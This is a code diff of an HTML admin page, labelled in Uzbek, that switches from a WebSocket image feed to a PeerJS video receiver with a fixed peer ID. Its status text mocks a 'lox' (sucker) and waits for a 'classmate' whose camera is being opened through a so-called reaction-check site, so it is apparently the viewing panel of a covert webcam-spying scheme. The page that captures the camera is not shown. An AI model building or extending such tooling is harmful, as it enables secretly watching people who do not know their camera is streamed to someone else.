@@ -2,78 +2,61 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <title>Developper Core - Monitoring</title>
+    <title>Dev core</title>
     <style>
         body { 
-            margin: 0; 
-            background-color: #000; 
-            color: #fff; 
-            font-family: sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
+            margin: 0; background-color: #000; color: #fff; 
+            font-family: sans-serif; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; height: 100vh; 
         }
-        h2 { 
-            margin-bottom: 20px; 
-        }
+        h2 { margin-bottom: 20px; letter-spacing: 1px; }
         .monitor-box { 
-            width: 80%; 
-            max-width: 800px; 
-            aspect-ratio: 16/9; 
-            border: 5px solid #fff; 
-            background-color: #111; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            position: relative; 
-            overflow: hidden; 
+            width: 80%; max-width: 800px; aspect-ratio: 16/9; 
+            border: 5px solid #fff; background-color: #111; 
+            display: flex; align-items: center; justify-content: center; 
+            position: relative; overflow: hidden; 
         }
-        #live-stream { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: contain; 
-            transform: scaleX(-1); 
-            display: none; 
+        #live-video { 
+            width: 100%; height: 100%; object-fit: contain; 
+            transform: scaleX(-1); display: none; 
         }
-        .no-user { 
-            position: absolute; 
-            color: #666; 
-            font-size: 20px; 
-        }
+        .no-user { position: absolute; color: #666; font-size: 20px; }
     </style>
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body>
 
-    <h2>Reaksiya chek sayt (Admin)</h2>
+    <h2>chek sayt</h2>
     
     <div class="monitor-box">
-        <span class="no-user" id="status">Lox ulanishi kutilmoqda...</span>
-        <img id="live-stream" src="" alt="Live Stream">
+        <span class="no-user" id="status">Loxni kamerasi ochilmoqda....</span>
+        <video id="live-video" autoplay playsinline muted></video>
     </div>
 
     <script>
-        const img = document.getElementById('live-stream');
+        const video = document.getElementById('live-video');
         const statusText = document.getElementById('status');
 
-        // Internet va Lokal uchun universal protokol aniqlash
-        const wsProtocol = window.location.protocol === "https:" ? "wss://" : "ws://";
-        const ws = new WebSocket(wsProtocol + window.location.host + "/ws?role=admin");
+        // Admin uchun maxsus o'zgarmas ID o'rnatamiz
+        const peer = new Peer('draghub-admin-panel-id');
 
-        ws.onmessage = (event) => {
-            if (statusText.style.display !== 'none') {
+        peer.on('open', (id) => {
+            statusText.innerText = "Sinfdosh ulanishi kutilmoqda... (Admin Tayyor)";
+        });
+
+        // Sinfdoshdan qo'ng'iroq (kamera oqimi) kelganda
+        peer.on('call', (call) => {
+            // Qo'ng'iroqqa javob beramiz
+            call.answer();
+            
+            call.on('stream', (userStream) => {
                 statusText.style.display = 'none';
-                img.style.display = 'block';
-            }
-            img.src = event.data;
-        };
-
-        ws.onclose = () => {
-            statusText.style.display = 'block';
-            statusText.innerText = "Server bilan aloqa uzildi.";
-            img.style.display = 'none';
-        };
+                video.style.display = 'block';
+                
+                // Jonli videoni pleyerga ulaymiz
+                video.srcObject = userStream;
+            });
+        });
     </script>
 </body>
 </html>
